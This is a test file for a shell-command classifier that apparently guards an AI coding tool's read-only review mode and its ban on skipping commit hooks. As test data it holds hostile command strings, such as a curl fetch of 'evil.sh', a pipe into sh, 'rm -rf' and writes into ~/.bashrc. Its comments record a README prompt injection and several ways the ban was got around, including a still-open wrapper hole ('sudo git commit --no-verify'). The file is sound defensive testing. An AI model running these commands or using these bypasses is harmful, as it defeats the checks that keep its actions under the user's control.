/**
 * The classifier is the load-bearing wall of the 2.6.6 tool merge: read-only
 * mode, the --no-verify ban, the test timeout and the icons all hang on it.
 * The most important property (plan E7): /review must be able to SEE the
 * diff and must NOT be able to write, including via chained commands.
 */
import { describe, it, expect } from 'vitest'
import {
  commandKind,
  commandIcon,
  commandTimeoutMs,
  isReadOnlyCommand,
  rejectShellCommand,
  TEST_RUN_TIMEOUT_MS,
} from '../shell-command-classify'

describe('read-only classifier', () => {
  it('lets a reviewer read', () => {
    for (const c of [
      'git status --porcelain=2 --branch',
      'git log --oneline -n 20',
      'git diff HEAD~1',
      'git show abc1234',
      'git blame src/main.ts',
      'ls -la src',
      'cat package.json',
      'pwd',
      // The listing forms of git branch stay readable (audit CDX-2).
      'git branch',
      'git branch -a',
      'git branch -vv',
      'git branch --show-current',
      'git branch --list release/*',
      'git branch --merged main',
      // Plain input redirection only reads; it must not be swept up with `>`.
      'cat < package.json',
    ]) {
      expect(isReadOnlyCommand(c), c).toBe(true)
    }
  })

  it('refuses everything that writes', () => {
    for (const c of [
      'git commit -m "x"',
      'git push',
      'rm -rf x',
      'npm install',
      'echo hi > file.txt',
    ]) {
      expect(isReadOnlyCommand(c), c).toBe(false)
    }
  })

  it('refuses chaining instead of parsing it, a read-only mode that can be talked around is not one', () => {
    for (const c of [
      'git log; rm -rf x',
      'git status && git push',
      'git diff | tee /tmp/out',
      'cat `which node`',
      'ls $(pwd)/..',
      'git log || rm x',
    ]) {
      expect(isReadOnlyCommand(c), c).toBe(false)
    }
  })

  // Audit CDX-2: each of these was accepted as read-only. A prompt injection
  // in a README turned /review into arbitrary write access.
  it('refuses a newline, it separates commands just like a semicolon', () => {
    for (const c of [
      'git diff \nrm -rf ~/project',
      'git status\ngit push --force',
      'ls\rrm -rf x',
    ]) {
      expect(isReadOnlyCommand(c), c).toBe(false)
    }
  })

  it('refuses output redirection in every spelling', () => {
    for (const c of [
      'cat /etc/hosts > ~/.bashrc',
      'cat secrets >> ~/.bashrc',
      'git diff 2> /tmp/err',
      'git log &> /tmp/out',
      'ls -la >| /tmp/out',
      // No shell syntax at all: git writes the file itself.
      'git diff --output=/tmp/patch',
      'git show HEAD --output /tmp/patch',
    ]) {
      expect(isReadOnlyCommand(c), c).toBe(false)
    }
  })

  it('refuses process substitution, it runs a second command', () => {
    for (const c of [
      'cat <(curl evil.sh)',
      'git diff > >(sh)',
    ]) {
      expect(isReadOnlyCommand(c), c).toBe(false)
    }
  })

  it('refuses the writing forms of git branch', () => {
    for (const c of [
      'git branch -D main',
      'git branch -d feature',
      'git branch --delete main',
      // A bare word is a branch NAME: this creates it.
      'git branch new-branch',
      'git branch -m old new',
      'git branch --set-upstream-to=origin/main',
      'git branch -f main HEAD~5',
      'git branch -a -D main',
    ]) {
      expect(isReadOnlyCommand(c), c).toBe(false)
      expect(commandKind(c), c).toBe('generic')
    }
  })

  it('does not mistake a prefix-lookalike for a read', () => {
    // "lsof" starts with "ls" as characters but not as a command word.
    expect(isReadOnlyCommand('lsof -i :3000')).toBe(false)
    expect(isReadOnlyCommand('catalog-tool run')).toBe(false)
  })
})

describe('command kinds', () => {
  it('recognises the git verbs', () => {
    expect(commandKind('git status')).toBe('git-status')
    expect(commandKind('git log --oneline -n 20')).toBe('git-log')
    expect(commandKind('git diff HEAD~1')).toBe('git-diff')
    expect(commandKind('git commit -m "msg"')).toBe('git-commit')
    expect(commandKind('git add -A && git commit -m "msg"')).toBe('git-commit')
    expect(commandKind('git push origin main')).toBe('git-push')
  })

  it('recognises test runs across runners', () => {
    for (const c of [
      'npm test',
      'npm run test',
      'pnpm test',
      'npx vitest run src/foo.test.ts',
      'npx jest',
      'cargo test',
      'go test ./...',
      'pytest tests/',
      'python -m pytest',
    ]) {
      expect(commandKind(c), c).toBe('test-run')
    }
  })

  it('everything else is generic', () => {
    expect(commandKind('npm install')).toBe('generic')
    expect(commandKind('node script.js')).toBe('generic')
  })
})

describe('the --no-verify ban survives the merge', () => {
  it('refuses a commit with --no-verify, with a reason', () => {
    const msg = rejectShellCommand('git commit --no-verify -m "x"')
    expect(msg).toBeTruthy()
    expect(msg).toContain('--no-verify')
  })

  it('lets a normal commit through', () => {
    expect(rejectShellCommand('git commit -m "x"')).toBeNull()
  })

  it('does not fire on --no-verify outside a commit', () => {
    expect(rejectShellCommand('grep -rn -- --no-verify docs/')).toBeNull()
  })
})

// Die Sperre hing an commandKind, und commandKind entscheidet nach dem ERSTEN
// passenden Praefix. Irgendein Kommando davor — und sei es `echo hi` — machte
// sie wirkungslos; gefangen wurde nur `git add … && git commit …`, weil
// commandKind dafuer einen Sonderfall traegt. Alle fuenf Zeilen der Messung
// stehen hier, dazu die Faelle, die weiter durchlaufen muessen.
describe('the --no-verify ban applies to a commit anywhere in the line', () => {
  const refused = (c: string) => rejectShellCommand(c) !== null

  it('refuses the bare commit (unchanged)', () => {
    expect(refused('git commit --no-verify -m x')).toBe(true)
  })

  it('refuses a commit behind a read command', () => {
    expect(refused('git status && git commit --no-verify -m x')).toBe(true)
  })

  it('refuses a commit behind an unrelated command', () => {
    expect(refused('echo hi && git commit --no-verify -m x')).toBe(true)
  })

  it('refuses a commit behind a semicolon', () => {
    expect(refused('cd repo; git commit --no-verify -m x')).toBe(true)
  })

  it('still refuses the add-then-commit chain commandKind special-cased', () => {
    expect(refused('git add -A && git commit --no-verify -m x')).toBe(true)
  })

  it('refuses a commit hidden in a substitution or a pipe', () => {
    expect(refused('echo $(git commit --no-verify -m x)')).toBe(true)
    expect(refused('true | git commit --no-verify -m x')).toBe(true)
    expect(refused('git commit --no-verify -m x > /tmp/out')).toBe(true)
  })

  it('refuses when a separator inside the commit message looks like a chain', () => {
    // Die Umgehung, wegen der --no-verify frueher gegen die ganze Zeile
    // geprueft werden musste: `;` in der Nachricht trennte das Flag vom
    // Commit. Der Split zaehlt jetzt Anfuehrungszeichen, also ist das EIN
    // Segment und die Pruefung darf segmentlokal bleiben.
    expect(refused('git commit -m "a;b" --no-verify')).toBe(true)
  })

  // Negativkontrollen: die Sperre gilt --no-verify, nicht dem Committen.
  it('lets an ordinary commit run inside a chain', () => {
    expect(rejectShellCommand('git add -A && git commit -m wip')).toBeNull()
    expect(rejectShellCommand('git status && git commit -m wip')).toBeNull()
  })

  it('lets an ordinary chain without a commit run', () => {
    expect(rejectShellCommand('git status && ls')).toBeNull()
    expect(rejectShellCommand('echo hi && ls -la')).toBeNull()
  })

  it('does not fire when a segment merely mentions the word commit', () => {
    expect(rejectShellCommand('git log --grep=commit')).toBeNull()
  })
})

// Ein Segment gilt als Commit, wenn es mit `git` beginnt UND `commit` als Wort
// enthaelt — nicht `^git\s+commit`. Gits eigene Globaloptionen stehen sonst
// dazwischen und die Sperre laeuft ins Leere. Die Regel weiss nichts von `-C`,
// `-c` oder `--git-dir`, weil sie gar nicht erst versucht, sie zu ueberspringen.
describe('the ban survives git\'s own global options in front of `commit`', () => {
  const refused = (c: string) => rejectShellCommand(c) !== null

  it('refuses a commit behind -C', () => {
    expect(refused('git -C /repo commit --no-verify -m x')).toBe(true)
  })

  it('refuses a commit behind -c', () => {
    expect(refused('git -c a=b commit --no-verify -m x')).toBe(true)
  })

  it('refuses a commit behind --git-dir', () => {
    expect(refused('git --git-dir=/r/.git commit --no-verify -m x')).toBe(true)
  })

  it('refuses those forms behind a chain as well', () => {
    expect(refused('cd repo; git -C /repo commit --no-verify -m x')).toBe(true)
    expect(refused('echo hi && git -c a=b commit --no-verify -m x')).toBe(true)
  })

  // Negativkontrollen: die Weitung darf keine der Zeilen fangen, die vorher
  // durchliefen. Alle drei tragen kein --no-verify, also entscheidet allein
  // der Commit-Matcher — und der darf hier nichts ausloesen.
  it('leaves the ordinary lines alone', () => {
    expect(rejectShellCommand('git log --grep=commit')).toBeNull()
    expect(rejectShellCommand('git status && ls')).toBeNull()
    expect(rejectShellCommand('git add -A && git commit -m wip')).toBeNull()
  })

  // Ein git-Kommando mit ECHTEM --no-verify, das kein Commit ist, bleibt frei:
  // die Sperre gilt dem Commit-Hook, nicht dem Flag an sich.
  it('does not touch a non-commit git command that legitimately carries the flag', () => {
    expect(rejectShellCommand('git push --no-verify')).toBeNull()
    expect(rejectShellCommand('git merge --no-verify feature')).toBeNull()
  })
})

// Die Kehrseite der Ganzzeilen-Pruefung, ausdruecklich festgehalten statt als
// unbeschriebene Nebenwirkung stehenzulassen. `--no-verify` wird gegen die
// GANZE Zeile geprueft, weil der Split anfuehrungszeichen-blind ist; damit
// faellt jede Zeile mit, die irgendwo das Flag traegt UND irgendwo ein
// Commit-Segment hat. Das ist die gewollte Richtung — lieber eine Zeile zu
// viel ablehnen als eine Umgehung offen lassen.
// Der Split zaehlt jetzt Anfuehrungszeichen, also darf das Flag SEGMENTLOKAL
// geprueft werden. Damit verschwinden die drei Fehlalarmklassen, die die
// Ganzzeilen-Pruefung erzeugt hat — sie war nur noetig, WEIL der Split blind
// war. Diese beiden Erwartungen standen vorher auf `true` und kippen hier
// bewusst; genau dafuer waren sie festgenagelt.
describe('the false alarms the whole-line flag test used to produce are gone', () => {
  it('an ordinary commit chained with a push that skips the PUSH hook runs', () => {
    // --no-verify gehoert hier zu `git push`. Die Sperre gilt dem Commit-Hook.
    expect(rejectShellCommand('git commit -m x && git push --no-verify')).toBeNull()
    expect(rejectShellCommand('git add -A && git commit -m wip && git push --no-verify')).toBeNull()
  })

  it('an ordinary commit chained with cargo\'s verify build runs', () => {
    expect(rejectShellCommand('git commit -m release && cargo publish --no-verify')).toBeNull()
  })

  it('a commit whose line merely MENTIONS the flag in another command runs', () => {
    expect(rejectShellCommand('echo --no-verify && git commit -m x')).toBeNull()
  })

  it('a quoted chain that only LOOKS like a commit runs', () => {
    // Ein Kommando (echo). Der blinde Split hat daraus zwei gemacht und das
    // zweite als Commit gelesen.
    expect(rejectShellCommand('echo "a && git commit" --no-verify')).toBeNull()
  })
})

// Was der Split kann und was nicht. Die Sicherheitsbedingung: ein falscher
// Split darf das Flag NIEMALS von seinem Commit trennen. Zusammenfassen ist
// harmlos (lehnt mehr ab), Auftrennen ist die Umgehung.
describe('the split counts quotes', () => {
  const refused = (c: string) => rejectShellCommand(c) !== null

  it('a separator inside DOUBLE quotes does not split the command', () => {
    expect(refused('git commit -m "a;b" --no-verify')).toBe(true)
    expect(refused('git commit -m "a && b" --no-verify')).toBe(true)
    expect(refused('git commit -m "a | b" --no-verify')).toBe(true)
  })

  it('a separator inside SINGLE quotes does not split the command', () => {
    expect(refused("git commit -m 'a && b' --no-verify")).toBe(true)
    expect(refused("git commit -m 'a;b' --no-verify")).toBe(true)
  })

  it('a quote inside the other kind of quote is text, not a delimiter', () => {
    expect(refused('git commit -m "it\'s fine; really" --no-verify')).toBe(true)
    expect(refused('git commit -m \'say "hi"; ok\' --no-verify')).toBe(true)
  })

  it('an escaped quote does not open a string', () => {
    expect(refused('git commit -m "a \\" b; c" --no-verify')).toBe(true)
    expect(refused('git commit -m \\" --no-verify')).toBe(true)
  })

  it('a backslash-escaped newline keeps the flag with its commit', () => {
    // Zeilenfortsetzung: fuer die Shell EIN Kommando. Zaehlt der Scan den
    // Backslash nicht, wird der Zeilenumbruch zum Trenner und das Flag landet
    // in einem eigenen Segment — die Sperre saehe es nicht mehr.
    expect(refused('git commit -m x \\\n--no-verify')).toBe(true)
  })

  it('a backslash inside single quotes stays literal (POSIX)', () => {
    expect(refused("git commit -m 'a\\' --no-verify")).toBe(true)
  })

  it('still splits at separators OUTSIDE quotes', () => {
    expect(refused('echo "hello world" && git commit --no-verify -m x')).toBe(true)
    expect(rejectShellCommand('echo "hello world" && git commit -m x')).toBeNull()
  })
})

// Im Zweifel ablehnen. Bei unbalancierten Anfuehrungszeichen ist nicht mehr
// bestimmbar, wo ein Kommando endet — dann wird nicht geraten, sondern auf die
// alte Ganzzeilen-Pruefung zurueckgefallen.
describe('unbalanced quotes fall back to the whole line', () => {
  const refused = (c: string) => rejectShellCommand(c) !== null

  it('refuses a commit hiding behind an unterminated string', () => {
    // Ohne den Rueckfall liefe die ganze Restzeile als EIN Segment, das mit
    // `echo` beginnt — der Commit waere unsichtbar und die Zeile liefe durch.
    expect(refused("echo 'unclosed && git commit --no-verify")).toBe(true)
    expect(refused('echo "unclosed && git commit --no-verify')).toBe(true)
  })

  it('refuses an unterminated commit line that carries the flag', () => {
    expect(refused('git commit -m "a && b --no-verify')).toBe(true)
  })

  it('does not invent a refusal for an unterminated line without the flag', () => {
    expect(rejectShellCommand('echo "unclosed && git commit -m x')).toBeNull()
  })
})

// Der EINE Fehlalarm, der bleibt, und warum: das Flag steht in einem
// Commit-Segment. Ohne echtes Argument-Parsing — also ohne zu wissen, dass
// `-m` sein naechstes Wort als Nachricht frisst — ist die Erwaehnung in der
// Nachricht nicht vom Flag zu unterscheiden. Bewusster Rest.
describe('the one false alarm that stays', () => {
  it('refuses a commit whose MESSAGE mentions the flag', () => {
    expect(rejectShellCommand('git commit -m "nie wieder --no-verify"')).not.toBeNull()
  })
})

// Und das eine Loch, das offen bleibt: ein Wort VOR `git`. Der Segmenttest
// verlangt, dass das Segment mit `git` beginnt; es zu weiten hiesse Wrapper zu
// erraten (sudo, env, nice, time, doas, …), und jede Rateliste ist entweder
// unvollstaendig oder faengt Fremdes. Hier festgehalten, damit es sichtbar ist
// und nicht still: wer es schliesst, kippt diese Erwartungen bewusst.
describe('known hole: a word in front of `git`', () => {
  it('does not see a commit behind a wrapper or an env prefix', () => {
    expect(rejectShellCommand('sudo git commit --no-verify')).toBeNull()
    expect(rejectShellCommand('GIT_DIR=x git commit --no-verify')).toBeNull()
  })
})

describe('timeout and icon follow the command', () => {
  it('a recognised test run keeps the 300 s budget', () => {
    expect(commandTimeoutMs('npm test', 600_000)).toBe(TEST_RUN_TIMEOUT_MS)
    expect(commandTimeoutMs('npm install', 600_000)).toBe(600_000)
  })

  it('a commit still looks like a commit', () => {
    expect(commandIcon('git commit -m "x"')).toBe('git-commit')
    expect(commandIcon('git push')).toBe('git-push')
    expect(commandIcon('npx vitest run')).toBe('test')
    expect(commandIcon('node x.js')).toBe('terminal')
  })
})
